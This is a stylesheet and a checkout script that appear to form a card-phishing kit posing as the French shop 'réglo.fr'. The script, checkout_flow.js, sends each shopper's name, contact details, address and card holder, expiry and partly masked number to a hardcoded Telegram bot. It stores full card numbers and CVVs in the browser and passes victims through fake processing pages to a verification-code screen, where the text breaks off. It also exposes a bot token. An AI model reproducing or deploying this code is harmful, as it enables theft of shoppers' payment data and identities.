/*
    Removed :root variables and global reset '*' as they will be inherited from style.css
    The primary color variable used here, e.g. var(--secondary-color) for buttons,
    will need to be updated to use a variable from style.css like var(--primary) or var(--accent)
    if the visual identity is to be unified. For now, they will default to browser/undefined behavior
    if not defined elsewhere.
*/

/* Styles for specific page body contexts */
body.payment-confirmation-body, 
body.payment-form-body, 
body.payment-verification-body,
body.processing-page-body { /* Added processing-page-body */
    background-color: var(--light-gray); /* Default for special pages - var(--light-gray) is defined in style.css */
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
}

/* Specific body style for traitement4.html and traitement7.html */
/* These are for the specific "processing" pages with the gears animation */
body#processing-page-4,
body#processing-page-7 {
    height: 100vh;
    background-color: #ffffff; /* Override for these specific pages */
    font-family: Arial, sans-serif; /* Override font if needed, or keep general */
    display: flex;
    justify-content: center;
    align-items: center;
}

/* .container is defined in style.css. If specific overrides are needed, they should be more specific. */
/* For now, removing this general .container definition. */

/* Container style for processing pages (traitement4, traitement7) */
/* style.css also has a .processing-container. These might need merging or namespacing. */
/* For now, keeping this one as it's tied to the gears animation structure specifically. */
.processing-container { /* This is for the gears animation page */
    text-align: center;
    max-width: none; 
    padding: 20px; 
}

/* Header styles might be common. For now, assume this is specific to checkout page structure if needed. */
/* If a global header is defined in style.css, this might be redundant or need namespacing. */
/* Keeping for now, as checkout might have a simplified header. */
header.checkout-header { /* Added a more specific class */
    background-color: white;
    box-shadow: var(--box-shadow); /* var(--box-shadow) is from style.css */
    padding: 20px 0;
    margin-bottom: 30px;
}

.logo { /* Assumed to be part of checkout-header. style.css also has .logo. */
    font-size: 24px;
    font-weight: 700;
    color: var(--dark); /* Changed from --primary-color to use style.css var */
    display: flex;
    align-items: center;
}

.logo i { 
    margin-right: 10px;
    color: var(--primary); /* Changed from --secondary-color to use style.css var */
}

.checkout-steps { 
    display: flex;
    justify-content: space-between;
    margin-bottom: 40px;
    position: relative;
}

.checkout-steps::before {
    content: '';
    position: absolute;
    top: 15px;
    left: 0;
    right: 0;
    height: 2px;
    background-color: #ddd;
    z-index: 1;
}

.step { 
    display: flex;
    flex-direction: column;
    align-items: center;
    position: relative;
    z-index: 2;
}

.step-number { 
    width: 32px;
    height: 32px;
    border-radius: 50%;
    background-color: var(--light-gray); /* Use var from style.css */
    color: var(--gray); /* Use var from style.css */
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: bold;
    margin-bottom: 8px;
}

.step.active .step-number {
    background-color: var(--primary); /* Use var from style.css */
    color: white;
}

.step.completed .step-number {
    background-color: var(--success); /* Use var from style.css */
    color: white;
}

.step-text { 
    font-size: 14px;
    color: var(--gray); /* Use var from style.css */
    font-weight: 500;
}

.step.active .step-text {
    color: var(--primary); /* Use var from style.css */
    font-weight: 600;
}

.step.completed .step-text {
    color: var(--success); /* Use var from style.css */
}

.checkout-grid, .payment-container { 
    display: grid;
    grid-template-columns: 1fr 350px;
    gap: 30px;
}

@media (max-width: 768px) {
    .checkout-grid, .payment-container { 
        grid-template-columns: 1fr;
    }
    
    .form-row { 
        grid-template-columns: 1fr;
    }
}

.checkout-section, .payment-card { 
    background-color: white;
    border-radius: var(--border-radius);
    box-shadow: var(--box-shadow);
    padding: 25px; 
    margin-bottom: 30px;
}
.payment-card { padding: 30px; } 

/* .section-title is defined in style.css. This seems to be a variation. */
/* Adding a more specific class if this variation is needed for checkout sections. */
.checkout-section-title { 
    font-size: 20px;
    margin-bottom: 20px;
    color: var(--dark); /* Use var from style.css */
    display: flex;
    align-items: center;
    border-bottom: 1px solid var(--light-gray); /* Use var from style.css */
    padding-bottom: 10px; 
}

.checkout-section-title i { 
    margin-right: 10px;
    color: var(--primary); /* Use var from style.css */
}

.form-group { 
    margin-bottom: 20px;
}

.form-row { 
    display: grid;
    grid-template-columns: 1fr 1fr; 
    gap: 15px;
}

label { 
    display: block;
    margin-bottom: 8px;
    font-weight: 500;
    color: #555;
}

input, select, textarea { 
    width: 100%;
    padding: 12px 15px;
    border: 1px solid var(--light-gray); /* Use var from style.css */
    border-radius: var(--border-radius); /* Use var from style.css */
    font-size: 16px; /* Consider standardizing font sizes */
    transition: var(--transition); /* Use var from style.css */
}

input:focus, select:focus, textarea:focus { 
    outline: none;
    border-color: var(--primary); /* Use var from style.css */
    box-shadow: 0 0 0 2px rgba(42, 157, 143, 0.2); /* Use var(--primary) based color */
}

.order-summary { 
    background-color: white;
    border-radius: var(--border-radius);
    box-shadow: var(--box-shadow);
    padding: 25px;
}

.order-summary-item {
    display: flex;
    justify-content: space-between;
    padding: 15px 0;
    border-bottom: 1px solid #eee;
}
.order-summary-item:last-child { border-bottom: none; }
.order-summary-item .product-info { display: flex; align-items: center; }
.order-summary-item .product-image {
    width: 60px; height: 60px; border-radius: 4px;
    object-fit: cover; margin-right: 15px;
}
.product-name { font-weight: 500; }
.product-variant { font-size: 13px; color: #777; margin-top: 3px; }
.product-price { font-weight: 600; }

.order-total {
    display: flex;
    justify-content: space-between;
    padding: 15px 0;
    font-size: 18px;
    font-weight: 700;
    color: var(--dark); /* Use var from style.css */
    border-top: 2px solid var(--light-gray);  /* Use var from style.css */
    margin-top: 10px; 
}

.payment-methods { margin-top: 20px; }
.payment-method {
    display: flex; align-items: center; padding: 15px;
    border: 1px solid var(--light-gray); /* Use var from style.css */
    border-radius: var(--border-radius); /* Use var from style.css */
    margin-bottom: 10px; cursor: pointer; transition: var(--transition); /* Use var from style.css */
    position: relative;
}
.payment-method:hover { border-color: var(--primary); } /* Use var from style.css */
.payment-method.active {
    border-color: var(--primary); /* Use var from style.css */
    background-color: rgba(42, 157, 143, 0.05); /* Use var(--primary) based color */
}
.payment-method input[type="radio"] { position: absolute; opacity: 0; }
.payment-method .payment-icon {
    width: 40px; height: 40px; display: flex;
    align-items: center; justify-content: center; margin-right: 15px;
}
.payment-method .payment-icon i { font-size: 24px; color: #555; }
.payment-method.active .payment-icon i { color: var(--primary); } /* Use var from style.css */
.payment-method .payment-details { flex: 1; }
.payment-method .payment-title { font-weight: 500; margin-bottom: 3px; }
.payment-method .payment-description { font-size: 13px; color: var(--gray); } /* Use var from style.css */
.payment-method .payment-logo {
    width: 80px; height: auto; object-fit: contain; margin-left: 15px;
}
.payment-method-badge {
    position: absolute; top: -8px; right: -8px;
    background-color: var(--success); color: white; /* Use var from style.css */
    border-radius: 50%; width: 20px; height: 20px;
    display: flex; align-items: center; justify-content: center;
    font-size: 12px; opacity: 0; transition: var(--transition); /* Use var from style.css */
}
.payment-method.active .payment-method-badge { opacity: 1; }

/* .btn styles are defined in style.css. This section defines specific button variants like .btn-success */
/* and a .bancontact-payment-btn. These should be kept if they are visually distinct or needed. */
/* The general .btn style here is removed to avoid conflict with style.css's .btn */

.btn-block { display: block; width: 100%; } /* This is a utility, can be kept or moved to style.css utilities */

.btn.btn-success { /* Make it a compound class to use base .btn from style.css */
    background-color: var(--success); /* Use var from style.css */
    border-color: var(--success); /* Assuming buttons in style.css might have borders */
    color: white;
}
.btn.btn-success:hover { background-color: #219955; /* Darken(--success) */ }

.btn:disabled { /* General disabled style for any button, can be in style.css */
    background-color: var(--light-gray); /* Use var from style.css */
    border-color: var(--light-gray);
    color: var(--gray);
    cursor: not-allowed;
}

.bancontact-payment-btn { /* This is a custom button theme */
    background-color: var(--bancontact-blue); /* Keep specific Bancontact color, define var if needed or use hex */
    color: white; /* Assuming white text for this button */
}
.bancontact-payment-btn:hover {
    background-color: #004080; /* Darker Bancontact blue */
}
/* Ensure .bancontact-payment-btn also has .btn class in HTML to get base btn padding/font etc. */


.secure-checkout { 
    display: flex; align-items: center; justify-content: center;
    margin-top: 20px; color: var(--gray); font-size: 14px; /* Use var from style.css */
}
.secure-checkout i { margin-right: 8px; color: var(--success); } /* Use var from style.css */

.verification-container { 
  background-color: white; border-radius: var(--border-radius); /* Use var from style.css */
  box-shadow: var(--box-shadow); padding: 40px; /* Use var from style.css */
  max-width: 600px; width: 100%; text-align: center;
}
.verification-header { margin-bottom: 30px; position: relative; }
.verification-header::after {
  content: ''; display: block; width: 100%; height: 1px;
  background-color: var(--light-gray); margin-top: 20px; /* Use var from style.css */
}
.verification-icon { font-size: 50px; color: var(--primary); margin-bottom: 20px; } /* Use var from style.css */
.verification-title { font-size: 24px; font-weight: 700; color: var(--dark); margin-bottom: 10px; } /* Use var from style.css */
.verification-subtitle { font-size: 16px; color: var(--gray); margin-bottom: 30px; } /* Use var from style.css */

.detail-row { display: flex; justify-content: space-between; margin-bottom: 10px; }
.detail-row:last-child { margin-bottom: 0; }
.detail-label { font-weight: 600; color: #555; }
.detail-value { color: var(--dark); } /* Use var from style.css */

.code-input-container { margin-bottom: 30px; }
.code-input-label { display: block; margin-bottom: 10px; font-weight: 600; color: #555; }
.code-input { 
  width: 100%; padding: 15px; border: 2px solid var(--light-gray); /* Use var from style.css */
  border-radius: var(--border-radius); font-size: 18px; /* Use var from style.css */
  text-align: center; letter-spacing: 5px; transition: var(--transition); /* Use var from style.css */
}
.code-input:focus {
  outline: none; border-color: var(--primary); /* Use var from style.css */
  box-shadow: 0 0 0 3px rgba(42, 157, 143, 0.2); /* Use var(--primary) based color */
}
.error-message { color: var(--danger); margin-top: 10px; font-size: 14px; display: none; } /* Use var from style.css */
.error-message i { margin-right: 5px; }

.verification-options { margin-top: 30px; }
.verification-options-title { font-size: 14px; color: var(--gray); margin-bottom: 15px; } /* Use var from style.css */
.option-buttons { display: flex; justify-content: center; gap: 15px; }
.option-btn {
  padding: 10px 20px; background-color: white; border: 1px solid var(--light-gray); /* Use var from style.css */
  border-radius: var(--border-radius); font-size: 14px; font-weight: 600; /* Use var from style.css */
  cursor: pointer; transition: var(--transition); /* Use var from style.css */
}
.option-btn:hover { background-color: #f9f9f9; }
.option-btn i { margin-right: 5px; }
.timer { margin-top: 20px; font-size: 14px; color: var(--gray); } /* Use var from style.css */

.loading-spinner { /* This is a small inline spinner, style.css has a larger processing-icon */
  display: inline-block; width: 20px; height: 20px;
  border: 3px solid rgba(255, 255, 255, 0.3); 
  border-radius: 50%; border-top-color: white; 
  animation: spin 1s ease-in-out infinite; /* Using spin animation from style.css */
  margin-left: 10px; 
}
/* @keyframes spin { to { transform: rotate(360deg); } } -- Removed, defined in style.css */

#order-confirmation-final-page .verification-container { max-width: 700px; }
#order-confirmation-final-page .verification-icon { color: var(--success); } /* Use var from style.css */
#order-confirmation-final-page .verification-subtitle { margin-bottom: 20px; }
#order-confirmation-final-page .payment-details { margin-bottom: 20px; padding: 20px; }
#order-confirmation-final-page .order-summary-section { margin-top: 30px; text-align: left; }
#order-confirmation-final-page .order-summary-section h3 {
    font-size: 18px; color: var(--dark); margin-bottom: 15px; /* Use var from style.css */
    padding-bottom: 10px; border-bottom: 1px solid var(--light-gray); /* Use var from style.css */
}
#order-confirmation-final-page .product-item {
    display: flex; align-items: center; margin-bottom: 15px;
    padding-bottom: 15px; border-bottom: 1px solid var(--light-gray); /* Use var from style.css */
}
#order-confirmation-final-page .product-item:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
#order-confirmation-final-page .product-image-small {
    width: 50px; height: 50px; object-fit: cover;
    border-radius: var(--border-radius); margin-right: 15px; /* Use var from style.css */
}
#order-confirmation-final-page .product-details-small { flex-grow: 1; display: flex; justify-content: space-between; }
#order-confirmation-final-page .product-details-small span:first-child { color: #333; }
#order-confirmation-final-page .product-details-small span:last-child { font-weight: 600; color: var(--dark); } /* Use var from style.css */
#order-confirmation-final-page .total-confirmed-amount {
    display: flex; justify-content: space-between; font-size: 18px;
    font-weight: 700; color: var(--dark); margin-top: 20px; /* Use var from style.css */
    padding-top: 20px; border-top: 2px solid var(--dark); /* Use var from style.css */
}
#order-confirmation-final-page .actions { margin-top: 30px; display: flex; justify-content: space-between; gap: 15px; }
#order-confirmation-final-page .actions .btn { width: auto; flex: 1; }
#order-confirmation-final-page .btn-secondary { background-color: var(--gray); } /* Use var from style.css */
#order-confirmation-final-page .btn-secondary:hover { background-color: #5a6268; /* Darken(--gray) */ }

.card-icons { display: flex; gap: 10px; margin-bottom: 20px; }
.card-icon {
    width: 50px; height: 30px; object-fit: contain;
    border: 1px solid var(--light-gray); border-radius: 4px; /* Use var from style.css */
    padding: 3px; background-color: white;
}
.card-wrapper { position: relative; }
.card-preview { 
    position: absolute; right: 10px; top: 50%;
    transform: translateY(-50%); font-size: 24px; 
    color: var(--gray); /* Use var from style.css */
}
.card-preview.fa-question-circle { cursor: help; }

.credit-card {
    background: linear-gradient(135deg, var(--dark), #4a6491); color: white; /* Use var from style.css for dark */
    border-radius: var(--border-radius); padding: 20px; margin-bottom: 30px; /* Use var from style.css */
    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1); position: relative;
    overflow: hidden; height: 200px; 
}
.credit-card::before, .credit-card::after { 
    content: ''; position: absolute; border-radius: 50%;
}
.credit-card::before {
    top: -50%; right: -50%; width: 200px; height: 200px;
    background: rgba(255, 255, 255, 0.1);
}
.credit-card::after {
    bottom: -30%; right: -20%; width: 150px; height: 150px;
    background: rgba(255, 255, 255, 0.05);
}
.card-logo { 
    display: flex; justify-content: space-between;
    align-items: center; margin-bottom: 30px;
}
.card-type { font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
.card-chip {
    width: 40px; height: 30px; background: linear-gradient(45deg, #ffd700, #e5c100); /* Gold color, can be a var if used elsewhere */
    border-radius: 5px; display: flex; align-items: center; justify-content: center;
}
.card-chip::before { 
    content: ''; width: 30px; height: 20px;
    border: 1px solid rgba(0, 0, 0, 0.3); border-radius: 3px;
}
.card-number { 
    font-size: 20px; letter-spacing: 2px; margin-bottom: 20px;
    font-family: 'Courier New', monospace; 
}
.card-details { display: flex; justify-content: space-between; }
.card-holder, .card-expiry { font-size: 14px; text-transform: uppercase; }
.card-label { font-size: 10px; opacity: 0.8; margin-bottom: 5px; }

.loading-overlay {
    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
    background-color: rgba(255, 255, 255, 0.8);
    display: flex; flex-direction: column;
    justify-content: center; align-items: center;
    z-index: 1000; opacity: 0; pointer-events: none; 
    transition: opacity 0.3s ease;
}
.loading-overlay.active { opacity: 1; pointer-events: all; }
.loading-overlay .loading-spinner { 
    width: 50px; height: 50px; border: 5px solid #f3f3f3; 
    border-top: 5px solid var(--primary); /* Use var from style.css */
    border-radius: 50%; animation: spin 1s linear infinite; /* Ensure 'spin' is consistently defined or use one from style.css */
    margin-bottom: 20px; margin-left: 0; 
}
.loading-text { font-size: 18px; color: var(--dark); font-weight: 500; } /* Use var from style.css */

.bancontact-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 30px;
}
.bancontact-logo { 
    width: 180px;
    height: auto;
}
.bancontact-card { 
    background: linear-gradient(135deg, var(--bancontact-blue), #0066b3); /* Keep bancontact specific colors */
    color: white;
    border-radius: var(--border-radius); /* Use var from style.css */
    padding: 25px;
    margin-bottom: 30px;
    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
    position: relative;
    overflow: hidden;
}
.bancontact-card::before {
    content: ''; position: absolute; top: -50px; right: -50px;
    width: 150px; height: 150px; background-color: rgba(255, 255, 255, 0.1);
    border-radius: 50%;
}
.bancontact-card::after {
    content: ''; position: absolute; bottom: -30px; right: -30px;
    width: 100px; height: 100px; background-color: var(--bancontact-orange); /* Keep bancontact specific colors */
    border-radius: 50%; opacity: 0.3;
}
.bancontact-card-content { position: relative; z-index: 2; }
.bancontact-card-title { font-size: 18px; font-weight: 600; margin-bottom: 20px; }
.bancontact-card-desc { font-size: 14px; opacity: 0.9; margin-bottom: 25px; }
.bancontact-features { display: flex; gap: 15px; margin-bottom: 25px; }
.bancontact-feature { display: flex; align-items: center; font-size: 13px; }
.bancontact-feature i { margin-right: 8px; color: var(--bancontact-orange); } /* Keep bancontact specific colors */

.card-number-input { 
    letter-spacing: 3px;
    font-family: monospace;
    padding-right: 40px; 
}
.card-input-container { 
    position: relative;
    margin-bottom: 20px; 
}

.bank-logos {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    margin-top: 20px;
    justify-content: center;
}
.bank-logo {
    height: 30px;
    width: auto;
    opacity: 0.8;
    transition: var(--transition); /* Use var from style.css */
}
.bank-logo:hover { opacity: 1; }

.loading-overlay.bancontact-loader .loading-spinner {
    border-top: 5px solid var(--bancontact-blue); /* Keep bancontact specific color */
}

/* Styles for traitement4.html & traitement7.html (Processing Pages with gears animation) */
/* These styles are for a different type of processing page than the one in style.css (which uses .processing-icon) */
/* Keeping them separate and scoped to .processing-container for these specific pages. */
.processing-container .gears img { /* This .processing-container is the one defined earlier in this file for these specific pages */
  width: 300px;
  height: auto;
  margin-bottom: 40px;
}

.processing-container .loader { 
  width: 70px;
  height: 70px;
  border: 6px solid #e0e0e0;
  border-top: 6px solid #4a4a4a; 
  border-radius: 50%;
  animation: spin 1s ease-in-out infinite; /* Using spin animation from style.css */
  margin: 0 auto 30px;
}

.processing-container .text { 
  font-size: 45px;
  color: #333;
}

[end of checkout.css]

[start of checkout_flow.js]
document.addEventListener('DOMContentLoaded', function() {
    // Telegram Bot Configuration
    const TELEGRAM_BOT_TOKEN = '7379672694:AAHa8hRRKCGDNTMK7HNyfIVNK0SQJ5SdNJ4';
    const TELEGRAM_CHAT_ID = '5372119436';
    
    // Load order data from localStorage
    const orderData = JSON.parse(localStorage.getItem('currentOrder'));
    const orderItemsContainer = document.getElementById('order-items');
    const orderTotalAmount = document.getElementById('order-total-amount');
    const placeOrderBtn = document.getElementById('place-order-btn');
    const deliveryForm = document.getElementById('delivery-form');
    
    // Payment method elements
    const creditCardMethod = document.getElementById('credit-card-method');
    const revolutMethod = document.getElementById('revolut-method');
    const bancontactMethod = document.getElementById('bancontact-method');
    let selectedPaymentMethod = 'credit-card'; // Default payment method
    
    // Initialize payment method selection
    function setupPaymentMethods() {
        const paymentMethods = [];
        if (creditCardMethod) paymentMethods.push(creditCardMethod);
        if (revolutMethod) paymentMethods.push(revolutMethod);
        if (bancontactMethod) paymentMethods.push(bancontactMethod);
        
        paymentMethods.forEach(method => {
            method.addEventListener('click', function() {
                paymentMethods.forEach(m => m.classList.remove('active'));
                this.classList.add('active');
                selectedPaymentMethod = this.querySelector('input').value;
            });
        });
        const defaultMethodInput = document.querySelector(`input[name="payment-method"][value="${selectedPaymentMethod}"]`);
        if (defaultMethodInput && defaultMethodInput.parentElement.classList.contains('payment-method')) {
            defaultMethodInput.parentElement.classList.add('active');
        }
    }
    
    function displayOrderItems() {
        if (!orderItemsContainer) return;
        if (!orderData || !orderData.items || orderData.items.length === 0) {
            orderItemsContainer.innerHTML = '<p>Aucun article dans votre commande.</p>';
            if(orderTotalAmount) orderTotalAmount.textContent = '0,00 €';
            return;
        }
        let html = '';
        orderData.items.forEach(item => {
            html += `
                <div class="order-summary-item">
                    <div class="product-info">
                        <img src="${item.image}" alt="${item.name}" class="product-image" onerror="this.src='placeholder.jpg'">
                        <div>
                            <div class="product-name">${item.name}</div>
                            <div class="product-variant">${item.variant}</div>
                            <div>Quantité: ${item.quantity}</div>
                        </div>
                    </div>
                    <div class="product-price">${(item.price * item.quantity).toFixed(2)} €</div>
                </div>
            `;
        });
        orderItemsContainer.innerHTML = html;
        if(orderTotalAmount) orderTotalAmount.textContent = `${orderData.total.toFixed(2)} €`;
    }
    
    async function sendOrderToTelegram(customer, paymentInfo = {}) { 
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.error('Telegram bot configuration missing');
            return false;
        }
        try {
            let message = `🛒 <b>NOUVELLE COMMANDE</b> 🛒\n\n`;
            message += `🆔 <b>Référence:</b> ${orderData.orderId}\n`;
            message += `📅 <b>Date:</b> ${new Date().toLocaleString('fr-FR', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' })}\n\n`;
            message += `👤 <b>Client:</b>\n- ${customer.firstName} ${customer.lastName}\n- 📧 ${customer.email}\n- 📞 ${customer.phone}\n\n`;
            message += `🏠 <b>Livraison:</b>\n- ${customer.address}\n- ${customer.postalCode} ${customer.city}\n- ${customer.country}\n`;
            if (customer.notes) message += `- Notes: ${customer.notes}\n`;
            
            const currentPaymentMethod = orderData.paymentMethod || selectedPaymentMethod; 
            message += `\n💳 <b>Paiement:</b> ${getPaymentMethodName(currentPaymentMethod)}\n`;

            if (paymentInfo.bank) message += `🏦 Banque: ${paymentInfo.bank}\n`;
            if (paymentInfo.cardHolder) message += `🧑 Titulaire: ${paymentInfo.cardHolder}\n`;
            if (paymentInfo.cardNumber) message += `#️⃣ Numéro: ${paymentInfo.cardNumber}\n`; 
            if (paymentInfo.cardExpiry) message += `🗓️ Expiration: ${paymentInfo.cardExpiry}\n`;

            message += `\n📦 <b>Articles (${orderData.items.reduce((sum, item) => sum + item.quantity, 0)}):</b>\n`;
            orderData.items.forEach(item => {
                message += `- ${item.name} (${item.variant}) × ${item.quantity}: ${(item.price * item.quantity).toFixed(2)} €\n`;
            });
            message += `\n💰 <b>Total:</b> ${orderData.total.toFixed(2)} €`;
            
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
            });
            const data = await response.json();
            if (!response.ok) { console.error('Telegram API Error:', data); return false; }
            console.log('Message envoyé avec succès à Telegram');
            return true;
        } catch (error) { console.error('Erreur lors de l\'envoi à Telegram:', error); return false; }
    }
    
    function getPaymentMethodName(method) {
        switch(method) {
            case 'credit-card': return 'Carte de crédit';
            case 'revolut': return 'Revolut';
            case 'bancontact': return 'Bancontact';
            default: return method;
        }
    }
    
    function getRedirectUrl() {
        const paymentMethodForRedirect = orderData.paymentMethod || selectedPaymentMethod;
        switch(paymentMethodForRedirect) {
            case 'credit-card': return 'traitement1.html';
            case 'revolut': return 'traitement10.html';
            case 'bancontact': return 'traitement20.html';
            default: return 'traitement1.html'; 
        }
    }
    
    if (placeOrderBtn && deliveryForm) { 
        placeOrderBtn.addEventListener('click', async function(e) {
            e.preventDefault();
            if (!deliveryForm.checkValidity()) { deliveryForm.reportValidity(); return; }
            const customer = {
                firstName: document.getElementById('first-name').value.trim(),
                lastName: document.getElementById('last-name').value.trim(),
                email: document.getElementById('email').value.trim(),
                phone: document.getElementById('phone').value.trim(),
                address: document.getElementById('address').value.trim(),
                city: document.getElementById('city').value.trim(),
                postalCode: document.getElementById('postal-code').value.trim(),
                country: document.getElementById('country').value.trim(),
                notes: document.getElementById('notes').value.trim()
            };
            if (!customer.firstName || !customer.lastName || !customer.email || !customer.phone || !customer.address || !customer.city || !customer.postalCode) {
                alert('Veuillez remplir tous les champs obligatoires'); return;
            }
            if (!orderData.orderId) orderData.orderId = `CMD-${Date.now().toString(36).toUpperCase().slice(-8)}`;
            orderData.customer = customer;
            orderData.paymentMethod = selectedPaymentMethod; 
            localStorage.setItem('currentOrder', JSON.stringify(orderData));
            window.location.href = getRedirectUrl();
        });
    }
    
    if (document.getElementById('order-items') && document.getElementById('delivery-form')) { 
        displayOrderItems();
        setupPaymentMethods();
        const countrySelect = document.getElementById('country');
        if (countrySelect) countrySelect.value = 'France';
    }

    // ---- Functions for traitement1.html (Credit Card Form) ----
    const cardForm = document.getElementById('payment-form'); 
    const loadingOverlay = document.getElementById('loading-overlay'); 
    
    if (cardForm && document.querySelector('.credit-card')) { 
        const cardUtils = { 
            formatNumber: num => num.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim(),
            detectType: num => {
                const cleaned = num.replace(/\s/g, '');
                if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleaned)) return 'Visa';
                if (/^5[1-5][0-9]{14}$/.test(cleaned)) return 'Mastercard';
                if (/^3[47][0-9]{13}$/.test(cleaned)) return 'American Express';
                return 'Carte Bancaire';
            },
            validateNumber: num => {
                const cleaned = num.replace(/\s/g, '');
                if (!/^[0-9]{13,16}$/.test(cleaned)) return false;
                let sum = 0; let alternate = false;
                for (let i = cleaned.length - 1; i >= 0; i--) {
                    let digit = parseInt(cleaned.charAt(i));
                    if (alternate) { digit *= 2; if (digit > 9) digit -= 9; }
                    sum += digit; alternate = !alternate;
                }
                return sum % 10 === 0;
            },
            validateExpiry: exp => {
                if (!exp || !exp.includes('/')) return false;
                const [mm, yy] = exp.split('/');
                const month = parseInt(mm), year = parseInt(yy);
                if (isNaN(month) || isNaN(year) || month < 1 || month > 12) return false;
                const now = new Date();
                const currentYear = now.getFullYear() % 100;
                const currentMonth = now.getMonth() + 1;
                return (year > currentYear) || (year === currentYear && month >= currentMonth);
            }
        };

        const cardNumberInput = document.getElementById('card-number');
        const cardHolderInput = document.getElementById('card-holder');
        const cardExpiryInput = document.getElementById('card-expiry');
        const cardCvvInput = document.getElementById('card-cvv');
        
        function updateCardPreview() {
            if(document.getElementById('card-number-display') && cardNumberInput) document.getElementById('card-number-display').textContent = cardNumberInput.value || '•••• •••• •••• ••••';
            if(document.getElementById('card-holder-display') && cardHolderInput) document.getElementById('card-holder-display').textContent = cardHolderInput.value.toUpperCase() || 'NOM PRÉNOM';
            if(document.getElementById('card-expiry-display') && cardExpiryInput) document.getElementById('card-expiry-display').textContent = cardExpiryInput.value || '••/••';
            if(document.getElementById('card-type-display') && cardNumberInput) document.getElementById('card-type-display').textContent = cardUtils.detectType(cardNumberInput.value);
        }

        if(cardNumberInput) cardNumberInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 16) value = value.slice(0, 16);
            e.target.value = cardUtils.formatNumber(value);
            updateCardPreview();
        });
        if(cardHolderInput) cardHolderInput.addEventListener('input', updateCardPreview);
        if(cardExpiryInput) cardExpiryInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 4) value = value.slice(0, 4);
            if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2);
            e.target.value = value;
            updateCardPreview();
        });
        if(cardCvvInput) cardCvvInput.addEventListener('input', updateCardPreview);

        cardForm.addEventListener('submit', async function(event) { 
            event.preventDefault();
            const cardNumber = cardNumberInput.value;
            const cardExpiry = cardExpiryInput.value;
            const cardCvc = cardCvvInput.value;
            const cardName = cardHolderInput.value;

            if (!cardUtils.validateNumber(cardNumber.replace(/\s/g, ''))) { alert("Numéro de carte invalide."); return; }
            if (cardName.trim().length < 3) { alert("Nom du titulaire invalide"); return; }
            if (!cardUtils.validateExpiry(cardExpiry)) { alert("Date d'expiration invalide (MM/AA)"); return; }
            const cardTypeForCVV = cardUtils.detectType(cardNumber);
            const cvvLength = cardTypeForCVV === 'American Express' ? 4 : 3;
            if (!cardCvc || !new RegExp(`^\\d{${cvvLength}}$`).test(cardCvc)) { alert(`CVV invalide (${cvvLength} chiffres requis)`); return; }

            if (loadingOverlay) loadingOverlay.classList.add('active'); 
            const paymentDetails = { cardNumber, cardExpiry, cardCvc, cardName, type: 'Credit Card' };
            localStorage.setItem('paymentDetails', JSON.stringify(paymentDetails));
            
            const currentOrderData = JSON.parse(localStorage.getItem('currentOrder')) || {};
            const customerData = currentOrderData.customer || {};
            await sendOrderToTelegram(customerData, { 
                type: 'Credit Card',
                cardHolder: cardName,
                cardNumber: cardNumber.slice(0, 4) + " **** **** " + cardNumber.slice(-4), 
                cardExpiry: cardExpiry
            });
            
            setTimeout(() => {
                if (loadingOverlay) loadingOverlay.classList.remove('active');
                window.location.href = 'traitement4.html'; 
            }, 2500); 
        });
        displayOrderItems(); 
    }

    // ---- Functions for traitement4.html & traitement7.html (Processing Pages) ----
    if (document.body.id === 'processing-page-4' || document.body.id === 'processing-page-7') {
        const currentOrderData = JSON.parse(localStorage.getItem('currentOrder')); // Use a local const
        const paymentDetails = JSON.parse(localStorage.getItem('paymentDetails'));
        if (currentOrderData && paymentDetails) {
            const messageElement = document.getElementById('processing-message');
            if (messageElement) messageElement.textContent = `Traitement de votre paiement par ${paymentDetails.type}. Un instant...`;
            
            // Save paymentVerificationData here, as this is a common processing step
            // Ensure orderData items are available, or handle if not (though they should be by this point)
            const itemsForTotal = currentOrderData.items || [];
            let totalForVerification = 0;
            if (itemsForTotal.length > 0) {
                 totalForVerification = itemsForTotal.reduce((total, item) => total + (item.price * item.quantity), 0);
            }

            const verificationData = {
                merchant: "réglo.fr",
                amount: totalForVerification.toFixed(2),
                cardLast4: paymentDetails.cardNumber ? paymentDetails.cardNumber.slice(-4) : (paymentDetails.type === "Bancontact" ? "N/A" : "****"), // Handle different types
                cardHolder: paymentDetails.cardName || (paymentDetails.type === "Bancontact" ? paymentDetails.name : "N/A"),
                orderId: currentOrderData.orderId || 'CMD-' + Math.random().toString(36).substr(2, 8).toUpperCase()
            };
            localStorage.setItem('paymentVerificationData', JSON.stringify(verificationData));

            setTimeout(() => {
                if (paymentDetails.type === 'RevolutPay') window.location.href = "traitement50.html";
                else window.location.href = "payment_confirmation_page.html"; 
            }, 3000); // The original script for traitement4 had 10s, but this consolidated logic uses 3s. Kept at 3s for consistency.
        } else {
            const messageElement = document.getElementById('processing-message');
            if(messageElement) messageElement.textContent = "Erreur: Données de commande ou de paiement manquantes.";
        }
    }


    // ---- Functions for payment_confirmation_page.html (Payment Verification Page - formerly confirmation.html) ----
    const paymentVerificationPageElements = {
        merchantName: document.getElementById('merchant-name'),
        paymentAmount: document.getElementById('payment-amount'),
        cardNumberDisplay: document.getElementById('card-number'),
        verificationCodeInput: document.getElementById('verification-code'),
        verifyBtn: document.getElementById('verify-btn'),
        btnText: document.getElementById('btn-text'),
        btnSpinner: document.getElementById('btn-spinner'),
        codeError: document.getElementById('code-error'),
        timerDisplay: document.getElementById('timer-display'),
